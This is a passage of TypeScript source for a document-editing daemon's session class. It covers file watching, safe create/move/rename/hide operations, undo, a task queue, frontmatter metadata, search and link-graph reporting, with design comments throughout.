        text = readFileSync(abs, "utf8");
      } catch {
        return null;
      }
      const h = contentHash(text);
      if (h === d.originalHash) return null; // our own save, or no change
      const clean = !this.isDirty(d);
      if (clean) {
        d.originalHash = h;
        this.writeActive(d, text);
        this.persist();
        return {
          kind: "original.reloaded",
          doc: d.slug,
          version: d.active,
          text,
          original: d.original,
        };
      }
      if (d.outsideChanged) return null; // already asked
      d.outsideChanged = true;
      this.persist();
      return { kind: "original.conflict", doc: d.slug, original: d.original };
    }

    // Something under a mirrored root: the tree may have changed.
    for (const e of this.m.context) {
      if (e.membership === "mirrored" && (abs === e.root || abs.startsWith(e.root + sep))) {
        return this.rescan(e.id) ? { kind: "tree", entryId: e.id } : null;
      }
    }
    return null;
  }

  // ── structure (E22–E24): real changes on disk, one path for both parties ──
  //
  // Every method below does the change ON DISK and then brings the context
  // model back in line with it. The surface reaches them through menus and
  // drag and drop, the agent through CLI verbs; the daemon announces each one
  // under the name of whoever did it. Two rules hold throughout:
  //
  // - NOTHING IS DELETED. `hide` takes a node out of Scriptorium; the file stays.
  // - NOTHING IS OVERWRITTEN. A destination that exists is refused (an explicit
  //   name) or given a free name (a default one, a drop); files are created
  //   with the exclusive flag, so a race cannot clobber either.

  /** E23: where drops and new top-level documents land. */
  get workspace(): string {
    return this.m.workspace ?? homedir();
  }

  setWorkspace(rawPath: string): { path: string } {
    const abs = resolve(rawPath);
    let isDir = false;
    try {
      isDir = statSync(abs).isDirectory();
    } catch {
      throw new SessionError(`no such folder: ${abs}`, 404);
    }
    if (!isDir) throw new SessionError(`the workspace must be a folder: ${abs}`, 400);
    this.m.workspace = abs;
    this.persist();
    return { path: abs };
  }

  /**
   * How a path reads in a chat line: `set/rel` inside a set, a single
   * document's file name, `workspace/…` in the workspace, else `~/…`.
   */
  display(abs: string): string {
    for (const e of this.m.context) {
      if (e.membership === "mirrored") {
        if (abs === e.root) return e.label;
        if (abs.startsWith(e.root + sep)) return `${e.label}/${toPosix(relative(e.root, abs))}`;
      } else if (e.nodes.some((n) => join(e.root, n.rel) === abs)) return e.label;
    }
    if (abs.startsWith(this.workspace + sep))
      return `workspace/${toPosix(relative(this.workspace, abs))}`;
    const home = homedir();
    return abs === home ? "~" : abs.startsWith(home + sep) ? `~${abs.slice(home.length)}` : abs;
  }

  /**
   * `abs` spelled the way the context spells it. A caller whose cwd is a
   * realpath (/private/var/… for /var/…, a symlinked folder) names the same
   * place differently, and it must land on the same node.
   */
  private spell(abs: string): string {
    if (this.m.context.some((e) => abs === e.root || abs.startsWith(e.root + sep))) return abs;
    const real = realOr(abs);
    for (const e of this.m.context) {
      const realRoot = realOr(e.root);
      if (real === realRoot) return e.root;
      if (real.startsWith(realRoot + sep)) return join(e.root, relative(realRoot, real));
    }
    return abs;
  }

  private isWorkspace(abs: string): boolean {
    return abs === this.workspace || realOr(abs) === realOr(this.workspace);
  }

  /** The mirrored entry that covers `abs` (its root, or anything under it), if any. */
  private coveringEntry(abs: string, except?: string): ContextEntry | undefined {
    return this.m.context.find(
      (e) =>
        e.id !== except &&
        e.membership === "mirrored" &&
        (abs === e.root || abs.startsWith(e.root + sep)),
    );
  }

  /**
   * A folder things may be made in or moved into: a mirrored entry's root, a
   * visible folder under one, or the workspace. Returns the absolute folder;
   * refuses anything else — the context stays the way in (verify-pass fix 1b).
   */
  private destinationOrDie(rawDir: string): string {
    const abs = this.spell(resolve(rawDir));
    for (const e of this.m.context) {
      if (e.membership !== "mirrored") continue;
      if (abs === e.root) return abs;
      if (abs.startsWith(e.root + sep)) {
        const node = findNode(e.nodes, toPosix(relative(e.root, abs)));
        if (node?.kind === "group") return abs;
      }
    }
    if (this.isWorkspace(abs)) return this.workspace;
    throw new SessionError(
      `${abs} is not a folder in this session — name a set, a folder inside one, or the workspace (${this.workspace})`,
      400,
    );
  }

  /** A document or folder shown in the context, with where it is shown. */
  private itemOrDie(rawPath: string): {
    abs: string;
    entry: ContextEntry;
    /** The whole entry (a set's own folder, a listed document), or a node inside a set. */
    whole: boolean;
    dir: boolean;
  } {
    const abs = this.spell(resolve(rawPath));
    for (const e of this.m.context) {
      if (e.membership === "listed") {
        const only = e.nodes[0];
        if (e.nodes.length === 1 && only?.kind === "doc" && join(e.root, only.rel) === abs)
          return { abs, entry: e, whole: true, dir: false };
        continue;
      }
      if (abs === e.root) return { abs, entry: e, whole: true, dir: true };
      if (abs.startsWith(e.root + sep)) {
        const node = findNode(e.nodes, toPosix(relative(e.root, abs)));
        if (node) return { abs, entry: e, whole: false, dir: node.kind === "group" };
      }
    }
    throw new SessionError(`${abs} is not shown in this session's context`, 404);
  }

  /**
   * `rawPath` if the context shows it — a document or folder in a set, a
   * listed document, a set's own folder — or it is the workspace; refused
   * otherwise. For acts that reach outside the spell (revealing a path in the
   * file manager), so a page cannot aim them at an arbitrary path.
   */
  shownPath(rawPath: string): string {
    const abs = this.spell(resolve(rawPath));
    if (this.itemAt(abs)) return abs;
    try {
      return this.destinationOrDie(abs);
    } catch {
      throw new SessionError(`${abs} is not shown in this session`, 400);
    }
  }

  /** Refuse a name that is not one plain file or folder name. */
  private nameOrDie(name: string): string {
    const n = name.trim();
    if (
      n === "" ||
      n === "." ||
      n === ".." ||
      n.startsWith(".") ||
      /[/\\\0]/.test(n) ||
      n.length > 255
    )
      throw new SessionError(
        `"${name}" is not a usable name — one plain name, no slashes, not starting with a dot`,
        400,
      );
    return n;
  }

  /** A document name: a name without a document extension gets `.md`. */
  private docNameOrDie(name: string): string {
    const n = this.nameOrDie(name);
    return isDocName(n) ? n : `${n}.md`;
  }

  /**
   * After something moved on disk from `from` to `to`, bring the model with it:
   * opened documents keep their versions under the new path, entries rooted at
   * or holding the moved thing follow it, and every mirror is re-read. An entry
   * that now sits inside another set is dropped — the set shows it already.
   */
  private followMove(from: string, to: string): void {
    const moved = (p: string): string | null =>
      p === from ? to : p.startsWith(from + sep) ? to + p.slice(from.length) : null;
    for (const d of this.m.docs) {
      const now = moved(d.original);
      if (now) {
        d.original = now;
        d.name = basename(now);
      }
    }
    const drop = new Set<string>();
    for (const e of this.m.context) {
      if (e.membership === "listed") {
        const only = e.nodes[0];
        if (only?.kind !== "doc") continue;
        const now = moved(join(e.root, only.rel));
        if (!now) continue;
        if (this.coveringEntry(now, e.id)) drop.add(e.id);
        else {
          e.root = dirname(now);
          e.label = basename(now);
          e.nodes = [{ kind: "doc", rel: basename(now) }];
        }
      } else {
        const now = moved(e.root);
        if (!now) continue;
        if (this.coveringEntry(now, e.id)) drop.add(e.id);
        else {
          e.root = now;
          e.label = basename(now) || now;
        }
      }
    }
    this.m.context = this.m.context.filter((e) => !drop.has(e.id));
    for (const e of this.m.context) if (e.membership === "mirrored") this.rescan(e.id);
    this.relink();
  }

  /** After a file or folder landed at `abs`: re-read the set it is in, or give it an entry. */
  private adoptNew(abs: string): void {
    const set = this.coveringEntry(abs);
    if (set) this.rescan(set.id);
    else this.m.context.push(entryForPath(abs, `c-${randHex(3)}`));
    this.relink();
  }

  /** A name in `dir` that is free: `name`, else `stem 2.ext`, `stem 3.ext`, … */
  private freeName(dir: string, name: string, isDir: boolean): string {
    if (!existsSync(join(dir, name))) return name;
    const ext = isDir ? "" : extname(name);
    const stem = ext ? name.slice(0, -ext.length) : name;
    for (let i = 2; ; i++) {
      const n = `${stem} ${i}${ext}`;
      if (!existsSync(join(dir, n))) return n;
    }
  }

  private refuseExisting(abs: string): void {
    if (existsSync(abs))
      throw new SessionError(`${abs} already exists — nothing was overwritten`, 409);
  }

  createDoc(rawDir: string, name?: string): { path: string } {
    const dir = this.destinationOrDie(rawDir);
    const file =
      name === undefined ? this.freeName(dir, "Untitled.md", false) : this.docNameOrDie(name);
    const abs = join(dir, file);
    this.refuseExisting(abs);
    writeFileSync(abs, "", { flag: "wx" });
    this.adoptNew(abs);
    this.persist();
    return { path: abs };
  }

  createFolder(rawDir: string, name?: string): { path: string } {
    const dir = this.destinationOrDie(rawDir);
    const folder =
      name === undefined ? this.freeName(dir, "New folder", true) : this.nameOrDie(name);
    const abs = join(dir, folder);
    this.refuseExisting(abs);
    mkdirSync(abs);
    this.adoptNew(abs);
    this.persist();
    return { path: abs };
  }

  /**
   * E26: what a move WOULD do, for the confirmation the surface shows before
   * moving a FOLDER. Reads nothing but the disk and refuses exactly what
   * `move` would refuse, so a confirmed move cannot then fail on admission.
   *
   * The git half is here because only the daemon can see a `.git`: a folder
   * dragged out of a repository is the case where the consequence reaches past
   * scriptorium (Cole moved this project's own docs folder into his workspace,
   * and git saw six deleted files).
   */
  movePlan(rawPath: string, rawInto: string): MovePlan {
    const item = this.itemOrDie(rawPath);
    const into = this.destinationOrDie(rawInto);
    const fromRepo = gitRootOf(dirname(item.abs));
    const intoRepo = gitRootOf(into);
    return {
      from: item.abs,
      into,
      name: basename(item.abs),
      folder: item.dir,
      docs: item.dir ? countDocs(item.abs) : 1,
      repo: fromRepo ? basename(fromRepo) : null,
      leavesRepo: fromRepo !== null && fromRepo !== intoRepo,
    };
  }

  move(rawPath: string, rawInto: string): { path: string; from: string } {
    const item = this.itemOrDie(rawPath);
    const into = this.destinationOrDie(rawInto);
    if (into === item.abs || into.startsWith(item.abs + sep))
      throw new SessionError(`cannot move ${this.display(item.abs)} into itself`, 400);
    if (dirname(item.abs) === into)
      throw new SessionError(`${this.display(item.abs)} is already in that folder`, 400);
    const to = join(into, basename(item.abs));
    this.refuseExisting(to);
    this.renameOrDie(item.abs, to);
    this.followMove(item.abs, to);
    if (!this.itemAt(to)) this.adoptNew(to);
    this.persist();
    return { path: to, from: item.abs };
  }

  rename(rawPath: string, name: string): { path: string; from: string } {
    const item = this.itemOrDie(rawPath);
    let next = this.nameOrDie(name);
    // A document keeps a document extension: "notes" renames notes.md to
    // notes.md, not to an extensionless file Scriptorium would stop showing.
    if (!item.dir && !isDocName(next)) next += extname(item.abs) || ".md";
    const to = join(dirname(item.abs), next);
    if (to === item.abs) return { path: to, from: item.abs };
    // A case-only rename on a case-insensitive disk finds "itself" existing.
    if (to.toLowerCase() !== item.abs.toLowerCase()) this.refuseExisting(to);
    this.renameOrDie(item.abs, to);
    this.followMove(item.abs, to);
    this.persist();
    return { path: to, from: item.abs };
  }

  private renameOrDie(from: string, to: string): void {
    try {
      renameSync(from, to);
    } catch (e) {
      const code = (e as NodeJS.ErrnoException).code;
      throw new SessionError(
        code === "EXDEV"
          ? `cannot move ${from} to another disk (${to}) — copy it instead`
          : `cannot move ${from} to ${to}: ${code ?? String(e)}`,
        409,
      );
    }
  }

  /** Whether `abs` is shown anywhere in the context now. */
  private itemAt(abs: string): boolean {
    try {
      this.itemOrDie(abs);
      return true;
    } catch {
      return false;
    }
  }

  /** "Remove from Scriptorium" — never from disk (E24). */
  hide(rawPath: string): { path: string; entry: string; removedEntry: boolean } {
    const item = this.itemOrDie(rawPath);
    if (item.whole) {
      this.removeContext(item.entry.id);
      return { path: item.abs, entry: item.entry.id, removedEntry: true };
    }
    const rel = toPosix(relative(item.entry.root, item.abs));
    item.entry.hidden = [...(item.entry.hidden ?? []).filter((h) => h !== rel), rel];
    this.rescan(item.entry.id);
    this.relink();
    this.closeOrphanedOpenDoc();
    this.persist();
    return { path: item.abs, entry: item.entry.id, removedEntry: false };
  }

  /**
   * The hidden list of the entry a path belongs to, BEFORE anything changes it
   * — what E60 records so a hide can be put back exactly.
   */
  hiddenBefore(rawPath: string): { entry: string; rels: string[] } | null {
    try {
      const item = this.itemOrDie(rawPath);
      return { entry: item.entry.id, rels: [...(item.entry.hidden ?? [])] };
    } catch {
      return null;
    }
  }

  /** The same, addressed by entry — what `unhide` needs recorded. */
  hiddenOfEntry(entryId: string): { entry: string; rels: string[] } | null {
    const e = this.m.context.find((x) => x.id === entryId);
    return e ? { entry: e.id, rels: [...(e.hidden ?? [])] } : null;
  }

  /**
   * Set an entry's hidden list to exactly `rels` (E60's inverse of both hide
   * and unhide). Returns what it WAS, so the caller can build the opposite act
   * without reading state it has already changed.
   */
  restoreHidden(entryId: string, rels: string[]): { entry: string; was: string[] } {
    const e = this.m.context.find((x) => x.id === entryId);
    if (!e)
      throw new SessionError(
        `no context entry ${entryId}`,
        404,
        this.m.context.map((x) => x.id),
      );
    const was = [...(e.hidden ?? [])];
    if (rels.length === 0) delete e.hidden;
    else e.hidden = [...rels];
    this.rescan(e.id);
    this.relink();
    this.closeOrphanedOpenDoc();
    this.persist();
    return { entry: e.id, was };
  }

  /**
   * Remove something this session created (E60's undo of a creation).
   *
   * ⛔ A NON-EMPTY DIRECTORY IS REFUSED, and no dialog can authorise it. Undo
   * works backwards, so it empties a folder before it reaches that folder's
   * creation; if the folder still has contents then something put them there
   * that the history does not know about, and removing a directory TREE is a
   * different act from removing the empty thing you just made. (Cole ruled the
   * file case the other way — confirmed, not refused — and this limit is the
   * carve-out he accepted.)
   *
   * ⚠ It also refuses anything that is not where the history said it was: a
   * path that has become a directory, or a directory that has become a file,
   * means the world moved and the recorded inverse no longer describes it.
   */
  removeCreated(rawPath: string, dir: boolean): { path: string; removed: boolean } {
    const abs = resolve(rawPath);
    let st: ReturnType<typeof statSync>;
    try {
      st = statSync(abs);
    } catch {
      // Already gone: the undo has nothing to do, which is not an error.
      return { path: abs, removed: false };
    }
    if (st.isDirectory() !== dir)
      throw new SessionError(
        `${this.display(abs)} is ${st.isDirectory() ? "a folder" : "a file"} now — the change this would undo no longer describes it`,
        409,
      );
    if (dir) {
      const left = readdirSync(abs);
      if (left.length > 0)
        throw new SessionError(
          `${this.display(abs)} is not empty (${left.length} item${left.length === 1 ? "" : "s"}) — move what is inside it out first`,
          409,
          left.slice(0, 10),
        );
      rmdirSync(abs);
    } else {
      unlinkSync(abs);
    }
    // Whatever pointed at it must stop pointing at it.
    for (const e of this.m.context) this.rescan(e.id);
    this.relink();
    this.closeOrphanedOpenDoc();
    this.persist();
    return { path: abs, removed: true };
  }

  unhide(entryId: string): { entry: string; restored: number } {
    const e = this.m.context.find((x) => x.id === entryId);
    if (!e)
      throw new SessionError(
        `no context entry ${entryId}`,
        404,
        this.m.context.map((x) => x.id),
      );
    const restored = e.hidden?.length ?? 0;
    delete e.hidden;
    this.rescan(e.id);
    this.relink();
    this.persist();
    return { entry: e.id, restored };
  }

  /**
   * E22: a single document becomes a set — a folder named for it beside it, the
   * document moved in, and the entry (same id) now mirrors that folder.
   */
  makeSet(rawPath: string): { path: string; folder: string; entry: string } {
    const item = this.itemOrDie(rawPath);
    if (item.entry.membership !== "listed" || item.dir)
      throw new SessionError(
        `${this.display(item.abs)} is already in a set — make a folder there instead`,
        400,
      );
    const parent = dirname(item.abs);
    const stem = basename(item.abs, extname(item.abs)) || "Untitled";
    const folder = join(parent, this.freeName(parent, stem, true));
    mkdirSync(folder);
    const to = join(folder, basename(item.abs));
    this.renameOrDie(item.abs, to);
    const e = item.entry;
    e.membership = "mirrored";
    e.root = folder;
    e.label = basename(folder);
    e.nodes = [];
    this.followMove(item.abs, to);
    this.persist();
    return { path: to, folder, entry: e.id };
  }

  /** The most text one import carries — a document, not a data dump. */
  static readonly IMPORT_MAX_BYTES = 8 * 1024 * 1024;

  /**
   * E23's drop: a COPY of a file's text, written under a free name into `into`
   * (default: the workspace), then shown like any other document.
   */
  importText(name: string, text: string, rawInto?: string): { path: string } {
    const file = this.nameOrDie(name);
    if (!isDocName(file))
      throw new SessionError(
        `not a document Scriptorium opens (${DOC_EXTENSIONS.join(" ")}): ${file}`,
        400,
        [...DOC_EXTENSIONS],
      );
    if (Buffer.byteLength(text) > Session.IMPORT_MAX_BYTES)
      throw new SessionError(
        `${file} is larger than ${Session.IMPORT_MAX_BYTES / 1024 / 1024} MB — not imported`,
        400,
      );
    const dir = this.destinationOrDie(rawInto ?? this.workspace);
    const abs = join(dir, this.freeName(dir, file, false));
    writeFileSync(abs, text, { flag: "wx" });
    this.adoptNew(abs);
    this.persist();
    return { path: abs };
  }

  // ── chat ───────────────────────────────────────────────────────────────

  // ── the work queue (E50) ───────────────────────────────────────────────────

  /**
   * Start a task. It is ANNOUNCED as a chat message and recorded as a task at
   * the same moment — Cole's framing, "a message that can be marked done" —
   * so the conversation reads as a narrative and the queue reads as state,
   * over one fact rather than two.
   */
  startTask(text: string, who: VersionAuthor): Task {
    const body = text.trim();
    if (!body) throw new SessionError("a task needs to say what the work is", 400);
    const message = this.addMessage(who, body);
    const task: Task = {
      id: `t-${randHex(4)}`,
      text: body,
      who,
      createdAt: Date.now(),
      messageId: message.id,
    };
    this.m.tasks = [...(this.m.tasks ?? []), task];
    this.persist();
    return task;
  }

  private taskOrDie(id: string): Task {
    const task = (this.m.tasks ?? []).find((t) => t.id === id);
    if (!task)
      throw new SessionError(
        `no task ${id} in this session`,
        404,
        (this.m.tasks ?? []).filter((t) => t.doneAt === undefined).map((t) => t.id),
      );
    return task;
  }

  /** Say what is being done right now — for work with steps worth watching. */
  setTaskStatus(id: string, status: string): Task {
    const task = this.taskOrDie(id);
    if (task.doneAt !== undefined)
      throw new SessionError(`task ${id} is already done — its status cannot change`, 409);
    task.status = status.trim();
    this.persist();
    return task;
  }

  /**
   * Mark it done. Idempotent on purpose: a task finished twice — an agent
   * retrying, a human clicking as the agent reports — is not an error, and
   * refusing would make the surface handle a race it did not cause.
   */
  finishTask(id: string, outcome?: string): { task: Task; already: boolean } {
    const task = this.taskOrDie(id);
    const already = task.doneAt !== undefined;
    if (!already) {
      task.doneAt = Date.now();
      task.status = undefined;
      if (outcome?.trim()) task.outcome = outcome.trim();
      this.persist();
    }
    return { task, already };
  }

  /**
   * Forget a task entirely — for one started by mistake. Marking it done would
   * put a thing that never happened into the record; a queue you cannot clear
   * of its own mistakes stops being a trustworthy account of the work.
   */
  removeTask(id: string): Task {
    const task = this.taskOrDie(id);
    this.m.tasks = (this.m.tasks ?? []).filter((t) => t.id !== id);
    this.persist();
    return task;
  }

  /**
   * Forget every finished task. Outstanding ones are untouched — clearing is
   * tidying what is OVER, never abandoning work still in flight.
   */
  clearDoneTasks(): number {
    const before = (this.m.tasks ?? []).length;
    this.m.tasks = (this.m.tasks ?? []).filter((t) => t.doneAt === undefined);
    const cleared = before - (this.m.tasks?.length ?? 0);
    if (cleared > 0) this.persist();
    return cleared;
  }

  /** Newest first — a queue is read from the top. */
  tasks(): Task[] {
    return [...(this.m.tasks ?? [])].sort((a, b) => b.createdAt - a.createdAt);
  }

  addMessage(
    who: ChatWho,
    text: string,
    extra: { selection?: Selection | null; activePath?: string | null } = {},
  ): ChatMessage {
    const msg: ChatMessage = { id: `m-${randHex(4)}`, who, text, ts: Date.now(), ...extra };
    this.m.chat.push(msg);
    this.persist();
    return msg;
  }

  // ── views ──────────────────────────────────────────────────────────────

  /** A document's frontmatter, from the ACTIVE version's text — what the human
   *  is reading, which is not always what is on disk (E32). */
  private metaOf(d: DocRecord): DocView["meta"] {
    try {
      return readMeta(readFileSync(this.versionPath(d, d.active), "utf8"));
    } catch {
      return null;
    }
  }

  docView(d: DocRecord): DocView {
    return {
      meta: this.metaOf(d),
      slug: d.slug,
      name: d.name,
      original: d.original,
      entryId: d.entryId,
      rel: d.rel,
      versions: d.versions.map((v) => ({ ...v, path: this.versionPath(d, v.n) })),
      notes: this.placedNotes(d),
      active: d.active,
      dirty: this.isDirty(d),
      outsideChanged: d.outsideChanged,
    };
  }

  doc(slug: string): DocView {
    return this.docView(this.docOrDie(slug));
  }

  /**
   * Frontmatter for every document in the context, by path (E32).
   *
   * Cached by path and mtime, and read HEAD-FIRST: a frontmatter block sits at
   * the top of a file, so a 300 KB document costs 8 KB of read. The cap keeps a
   * 2,000-node mirror from meaning 2,000 reads per snapshot, and hitting it is
   * SAID on the wire rather than left to look like documents without any.
   */
  private metaCache = new Map<string, { mtimeMs: number; summary: DocSummary | null }>();

  contextMeta(cap = META_SCAN_CAP): { map: Record<string, DocSummary>; truncated: boolean } {
    const map: Record<string, DocSummary> = {};
    let seen = 0;
    let truncated = false;
    for (const e of this.m.context) {
      for (const abs of docPaths(e)) {
        if (seen >= cap) {
          truncated = true;
          break;
        }
        seen++;
        let mtimeMs: number;
        try {
          mtimeMs = statSync(abs).mtimeMs;
        } catch {
          continue;
        }
        const hit = this.metaCache.get(abs);
        let summary: DocSummary | null;
        if (hit && hit.mtimeMs === mtimeMs) summary = hit.summary;
        else {
          summary = summarize(readMeta(readHead(abs)));
          this.metaCache.set(abs, { mtimeMs, summary });
        }
        if (summary) map[abs] = summary;
      }
      if (truncated) break;
    }
    return { map, truncated };
  }

  /**
   * One document's frontmatter as read, or every context document's (E32). The
   * agent gets the daemon's parse rather than re-reading the YAML itself.
   */
  metaFor(rawPath?: string): Record<string, unknown> {
    if (rawPath !== undefined) {
      const abs = this.shownPath(rawPath);
      const meta = readMeta(readHead(abs));
      return { path: abs, meta, ...(meta ? {} : { note: "no frontmatter block" }) };
    }
    const out: { path: string; meta: DocMeta | null }[] = [];
    for (const e of this.m.context)
      for (const abs of docPaths(e)) out.push({ path: abs, meta: readMeta(readHead(abs)) });
    return { documents: out, count: out.length };
  }

  /**
   * pdocs's `find`, over this session's context. Same filter names, same
   * ANDing, and the same rule that an empty result is an ANSWER: `count` says
   * how many matched, and the caller reads that rather than the exit code.
   */
  find(filter: MetaFilter): Record<string, unknown> {
    const matches: Record<string, unknown>[] = [];
    for (const e of this.m.context)
      for (const abs of docPaths(e)) {
        const meta = readMeta(readHead(abs));
        if (!matchesFilter(meta, filter)) continue;
        matches.push({
          path: abs,
          entry: e.id,
          ...(meta?.type ? { type: meta.type } : {}),
          ...(meta?.title ? { title: meta.title } : {}),
          ...(meta?.description ? { description: meta.description } : {}),
          status: meta?.status ?? null,
          ...(meta?.lifecycle ? { lifecycle: meta.lifecycle } : {}),
          tags: meta?.tags ?? [],
          date: meta?.date ?? null,
        });
      }
    return { matches, count: matches.length };
  }

  /**
   * One set's map (E33): its documents as nodes, and the four sources of edges
   * — body links, wiki links, typed links and frontmatter references.
   */
  graphFor(entryId?: string): GraphPayload {
    const e = entryId
      ? this.m.context.find((x) => x.id === entryId)
      : this.m.context.find((x) => x.membership === "mirrored");
    if (!e)
      throw new SessionError(
        entryId ? `no context entry ${entryId}` : "this session has no set to map",
        404,
        this.m.context.map((x) => x.id),
      );
    const paths = docPaths(e);
    const index: BundleIndex = {
      root: e.root,
      paths,
      metaOf: (p) => readMeta(readHead(p)),
      exists: (p) => existsSync(p),
      repoRoot: gitRootOf(e.root),
    };
    const g = buildGraph(index, (p) => {
      try {
        return splitFrontmatter(readFileSync(p, "utf8")).body;
      } catch {
        return "";
      }
    });
    return { entry: e.id, ...g };
  }

  /**
   * Search everything in the context: fuzzy over names, exact over content (E59).
   *
   * ⛔ THIS IS WHY THE VERB EXISTS AT ALL, and the reason is one line: a
   * document open in the session is shown as its ACTIVE VERSION, which lives
   * under the session home and not at the original path. An agent grepping the
   * workspace therefore finds the SAVED file and silently misses the text the
   * human is reading — so "search what you can see" is a question only the
   * session can answer. Everything else about searching files, an agent can
   * already do with grep, which is why there is no in-document verb.
   *
   * ⚠ Hidden documents are excluded, because the context is what the human
   * chose to look at; a result they cannot see in the sidebar would be a result
   * they cannot open.
   */
  searchAll(opts: { query: string; limit?: number }): SearchReport {
    const candidates: Candidate[] = [];
    const seen = new Set<string>();
    for (const entry of this.m.context) {
      for (const path of docPaths(entry)) {
        if (seen.has(path)) continue;
        seen.add(path);
        const record = this.m.docs.find((d) => d.original === path);
        const title = readMeta(readHead(path))?.title;
        candidates.push({
          path,
          name: basename(path),
          ...(record ? { slug: record.slug, version: record.active } : {}),
          ...(title ? { title } : {}),
        });
      }
    }
    return searchDocuments(
      candidates,
      opts.query,
      (c) => {
        // The ACTIVE VERSION when the session has one — see the note above.
        const record =
          c.slug === undefined ? undefined : this.m.docs.find((d) => d.slug === c.slug);
        if (record) return this.activeText(record);
        return readFileSync(c.path, "utf8");
      },
      opts.limit !== undefined ? { total: opts.limit } : {},
    );
  }

  /**
   * Every link in a set that nothing answers — the report you can ACT on (E54).
   *
   * ⛔ IT EXISTS BECAUSE `graph` ALREADY HAD THE FACTS AND STILL DID NOT ANSWER
   * THE QUESTION. Cole asked whether an agent can check dangling links; the
   * honest answer was "yes, by fetching a set's whole map and filtering several
   * hundred edges", which is a different thing from being able to check them.
   * This says only what is broken, and says it as `file:line` plus THE STRING
   * THE DOCUMENT ACTUALLY CONTAINS — which is what you need to repair one, and
   * what the map's resolved `to` had quietly thrown away.
   *
   * ⚠ NOT AN ERROR. A dangling link is a fact about a set, not a failure: OKF
   * §11's rule, and it is why this reports and exits zero. Documents that point
   * at things not written yet are normal in a world bible.
   */
  danglingLinks(entryId?: string): Record<string, unknown> {
    const g = this.graphFor(entryId);
    const broken = g.edges.filter((e) => e.state === "missing");
    // ⛔ BODY LINES BECOME FILE LINES HERE. Links are extracted from the body,
    // so the number the graph carries is short by however much frontmatter the
    // document has — and a report is for opening a file at a line.
    const offsets = new Map<string, number>();
    const offsetOf = (path: string): number => {
      const known = offsets.get(path);
      if (known !== undefined) return known;
      let off = 0;
      try {
        off = bodyLineOffset(readFileSync(path, "utf8"));
      } catch {
        /* unreadable — report the body line rather than nothing */
      }
      offsets.set(path, off);
      return off;
    };
    return {
      entry: g.entry,
      root: g.root,
      count: broken.length,
      links: broken.map((e) => ({
        from: e.from,
        ...(e.line !== undefined ? { line: e.line + offsetOf(e.from) } : {}),
        // What the document says, not what we looked for.
        ...(e.raw !== undefined ? { wrote: e.raw } : {}),
        // Where the resolution ended up, so a near-miss is visible.
        tried: e.to,
        source: e.source,
        ...(e.key ? { key: e.key } : {}),
        ...(e.rel.length ? { rel: e.rel } : {}),
      })),
    };
  }

  /**
   * What cites a document. `related` (frontmatter) and `links` (body) are kept
   * APART, which is how pdocs reports it and the distinction is real: one is a
   * claim about the document, the other a citation in prose.
   */
  backlinks(rawPath: string): Record<string, unknown> {
    const abs = this.shownPath(rawPath);
    const entry = this.m.context.find(
      (e) => e.membership === "mirrored" && (abs === e.root || abs.startsWith(e.root + sep)),
    );
    if (!entry) throw new SessionError(`${abs} is not inside a set, so nothing maps it`, 400);
    const g = this.graphFor(entry.id);
    const inbound = g.edges.filter((x) => x.to === abs);
    const title = (p: string) => g.nodes.find((n) => n.path === p)?.title ?? basename(p);
    return {
      target: { path: abs, title: title(abs) },
      related: inbound
        .filter((x) => x.source === "frontmatter")
        .map((x) => ({ path: x.from, title: title(x.from), key: x.key })),
      links: inbound
        .filter((x) => x.source === "link")
        .map((x) => ({ path: x.from, title: title(x.from), rel: x.rel })),
      count: inbound.length,
    };
  }

  /** Where does this link go? The surface asks before following one (E33). */
  resolveLink(from: string, target: string): Resolution {
    const src = this.shownPath(from);
    const entry = this.m.context.find(
      (e) => e.membership === "mirrored" && src.startsWith(e.root + sep),
    );
    const root = entry?.root ?? dirname(src);
    const paths = entry ? docPaths(entry) : [src];
    return resolveTarget(target, src, {
      root,
      paths,
      metaOf: (p) => readMeta(readHead(p)),
      exists: (p) => existsSync(p),
      repoRoot: gitRootOf(root),
    });
  }

  /**
   * What a frontmatter block for this document WOULD say (E35). Suggested, not
   * written: the type comes from the documents beside it, the title from its
   * own H1, and `description` is left blank for whoever fills it in.
   */
  suggestMeta(rawPath: string, by?: string): { path: string; block: string; type?: string } {
    const abs = this.shownPath(rawPath);
    const text = readFileSync(abs, "utf8");
    if (splitFrontmatter(text).raw !== null)
      throw new SessionError(`${basename(abs)} already has frontmatter`, 409);
    const folder = dirname(abs);
    const siblings: string[] = [];
    for (const e of this.m.context)
      for (const p of docPaths(e))
        if (p !== abs && dirname(p) === folder) {
          const t = readMeta(readHead(p))?.type;
          if (t) siblings.push(t);
        }
    const type = guessType(siblings, basename(folder));
    return {
      path: abs,
      type,
      block: buildBlock({
        ...(type ? { type } : {}),
        ...(titleFromBody(text) ? { title: titleFromBody(text) as string } : {}),
        ...(by ? { by } : {}),
      }),
    };
  }

  /**
   * Write a new block into a document that has none (E35).
   *
   * ⛔ THIS WRITES THE ORIGINAL, which E7 otherwise reserves for Save — and
   * that is the ruling, not an oversight: the agent's verb writes the file, and
   * if the human has unsaved edits to it the CONFLICT BAR appears and they
   * choose (Cole: "we can adjust if needed after getting actual usage behind
   * us"). Refusing while a buffer is dirty would let an open document block the
   * agent indefinitely. The HUMAN's own path never comes here: their "add
   * frontmatter" is an edit to their buffer, which Save writes like any other.
   */
  metaInit(rawPath: string, opts: { type?: string; by?: string } = {}): Record<string, unknown> {
    const suggested = this.suggestMeta(rawPath, opts.by);
    const abs = suggested.path;
    const text = readFileSync(abs, "utf8");
    const block = opts.type
      ? buildBlock({
          type: opts.type,
          ...(titleFromBody(text) ? { title: titleFromBody(text) as string } : {}),
          ...(opts.by ? { by: opts.by } : {}),
        })
      : suggested.block;
    writeFileSync(abs, withBlock(text, block));
    this.metaCache.delete(abs);
    return { path: abs, type: opts.type ?? suggested.type ?? null, added: true };
  }

  /** Set keys in an existing block — a LINE edit each, so nothing else moves. */
  metaSet(rawPath: string, pairs: Record<string, string>): Record<string, unknown> {
    const abs = this.shownPath(rawPath);
    let text = readFileSync(abs, "utf8");
    if (splitFrontmatter(text).raw === null)
      throw new SessionError(`${basename(abs)} has no frontmatter — add it first (meta-init)`, 409);
    for (const [key, value] of Object.entries(pairs)) {
      if (!/^[A-Za-z_][A-Za-z0-9_.-]*$/.test(key))
        throw new SessionError(`"${key}" is not a frontmatter key`, 400);
      text = setKey(text, key, value);
    }
    writeFileSync(abs, text);
    this.metaCache.delete(abs);
    return { path: abs, set: Object.keys(pairs) };
  }

  /** The session's half of `PublicState`; the daemon adds the home-level `prefs` and `userHome`. */
  /**
   * The conversation, without building a snapshot around it.
   *
   * ⚠ E53's attention tick runs every second and only needs the chat; calling
